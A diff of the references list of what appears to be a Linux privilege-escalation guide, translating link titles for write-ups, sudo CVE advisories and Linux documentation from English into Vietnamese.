-- [3] [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
+- [1] [0xdf – HTB Planning (nâng quyền qua giao diện Crontab UI, tái sử dụng thông tin đăng nhập zip -P)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
+- [2] [0xdf – HTB Era: payload .text_sig giả mạo cho monitor được cron thực thi](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
+- [3] [0xdf – Holiday Hack Challenge 2025: vượt qua Neighborhood Watch (chiếm quyền PATH qua sudo env_keep)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
 - [4] [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
-- [5] [Basic Linux Privilege Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
-- [6] [Linux Privilege Escalation Guide](https://payatu.com/guide-linux-privilege-escalation/)
-- [7] [Attack and Defend: Linux Privilege Escalation Techniques of 2016](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
-- [8] [No one expect command execution!](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
-- [9] [Sudo (LD_PRELOAD) (Linux Privilege Escalation)](https://touhidshaikh.com/blog/?p=827)
-- [10] [lpeworkshop – Lab Exercises Walkthrough - Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
-- [11] [frizb/Linux-Privilege-Escalation: Tips and Tricks for Linux Priv Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
+- [5] [Nâng quyền Linux cơ bản](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
+- [6] [Hướng dẫn nâng quyền Linux](https://payatu.com/guide-linux-privilege-escalation/)
+- [7] [Tấn công và phòng thủ: các kỹ thuật nâng quyền Linux năm 2016](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
+- [8] [Không ai ngờ lại có thể thực thi lệnh!](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
+- [9] [Sudo (LD_PRELOAD) (Nâng quyền Linux)](https://touhidshaikh.com/blog/?p=827)
+- [10] [lpeworkshop – Hướng dẫn bài tập thực hành - Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
+- [11] [frizb/Linux-Privilege-Escalation: mẹo và thủ thuật nâng quyền Linux](https://github.com/frizb/Linux-Privilege-Escalation)
 - [12] [lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
-- [13] [rtcrowley/linux-private-i: Linux Enumeration & Privilege Escalation tool](https://github.com/rtcrowley/linux-private-i)
-- [14] [What is a Socket?](https://www.linux.com/news/what-socket/)
-- [15] [Peppo (Proving Grounds) writeup](https://muzec0318.github.io/posts/PG/peppo.html)
-- [16] [Get on the D-BUS](https://www.linuxjournal.com/article/7744)
-- [17] [SUID Executables Linux Privilege Escalation](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
-- [18] [Sudo Part-2 – Linux Privilege Escalation](https://juggernaut-sec.com/sudo-part-2-lpe)
-- [19] [How to manage ACLs on Linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
-- [20] [Redhat/CentOS root through network-scripts](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
-- [21] [What is systemd?](https://www.linode.com/docs/guides/what-is-systemd/)
-- [22] [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
-- [23] [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
+- [13] [rtcrowley/linux-private-i: công cụ kiểm kê và nâng quyền Linux](https://github.com/rtcrowley/linux-private-i)
+- [14] [Socket là gì?](https://www.linux.com/news/what-socket/)
+- [15] [Bài viết phân tích Peppo (Proving Grounds)](https://muzec0318.github.io/posts/PG/peppo.html)
+- [16] [Tìm hiểu về D-BUS](https://www.linuxjournal.com/article/7744)
+- [17] [Nâng quyền Linux qua file thực thi SUID](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
+- [18] [Sudo phần 2 – Nâng quyền Linux](https://juggernaut-sec.com/sudo-part-2-lpe)
+- [19] [Cách quản lý ACL trên Linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
+- [20] [Chiếm quyền root trên Redhat/CentOS qua network-scripts](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
+- [21] [systemd là gì?](https://www.linode.com/docs/guides/what-is-systemd/)
+- [22] [0xdf – HTB Eureka (chèn arithmetic trong bash qua log, chuỗi khai thác tổng thể)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
+- [23] [Hướng dẫn GNU Bash – BASH_ENV (file khởi động không tương tác)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
 - [24] [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
-- [25] [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR symlink privesc)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
-- [26] [0xdf – HTB Slonik (pg_basebackup cron copy → SUID bash)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
-- [27] [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
-- [28] [Stratascale – CVE-2025-32463: Sudo Chroot Elevation of Privilege](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)
-- [29] [Rich Mirch – CVE-2025-32462 and CVE-2025-32463 Sudo elevation-of-privilege vulnerabilities](https://blog.mirch.io/sudo-elevation-of-privilege-vulnerabilities/)
+- [25] [0xdf – HTB Previous (sudo terraform dev_overrides + nâng quyền qua symlink TF_VAR)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
+- [26] [0xdf – HTB Slonik (cron sao chép bằng pg_basebackup → bash SUID)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
+- [27] [NVISO – Bạn đặt tên gì, VMware nâng quyền thứ đó (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
+- [28] [Stratascale – CVE-2025-32463: nâng quyền qua Sudo Chroot](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)
+- [29] [Rich Mirch – Lỗ hổng nâng quyền Sudo CVE-2025-32462 và CVE-2025-32463](https://blog.mirch.io/sudo-elevation-of-privilege-vulnerabilities/)
 - [30] [0xdf – HTB: Browsed](https://0xdf.gitlab.io/2026/03/28/htb-browsed.html)
-- [31] [PEP 3147 – PYC Repository Directories](https://peps.python.org/pep-3147/)
-- [32] [Python importlib docs](https://docs.python.org/3/library/importlib.html)
-- [33] [polkit/polkit issue #74](https://gitlab.freedesktop.org/polkit/polkit/issues/74)
+- [31] [PEP 3147 – Thư mục lưu trữ PYC](https://peps.python.org/pep-3147/)
+- [32] [Tài liệu Python importlib](https://docs.python.org/3/library/importlib.html)
+- [33] [polkit/polkit vấn đề #74](https://gitlab.freedesktop.org/polkit/polkit/issues/74)
 - [34] [mirchr/security-research](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh)
-- [35] [Tweet by @paragonsec](https://twitter.com/paragonsec/status/1071152249529884674)
-- [36] [redsiege.com - Logging Passwords On Linux](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux)
-- [37] [tech.feedyourhead.at - Details Of A Logrotate Race Condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)
-- [38] [Python 3.10 documentation – `site` and path configuration files](https://docs.python.org/3.10/library/site.html)
+- [35] [Tweet của @paragonsec](https://twitter.com/paragonsec/status/1071152249529884674)
+- [36] [redsiege.com - Ghi lại mật khẩu trên Linux](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux)
+- [37] [tech.feedyourhead.at - Chi tiết về race condition của Logrotate](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)
+- [38] [Tài liệu Python 3.10 – `site` và các file cấu hình đường dẫn](https://docs.python.org/3.10/library/site.html)
 - [39] [0xdf – HTB: SmartHire](https://0xdf.gitlab.io/2026/09/26/htb-smarthire.html)
-
 {{#include ../../../banners/hacktricks-training.md}}
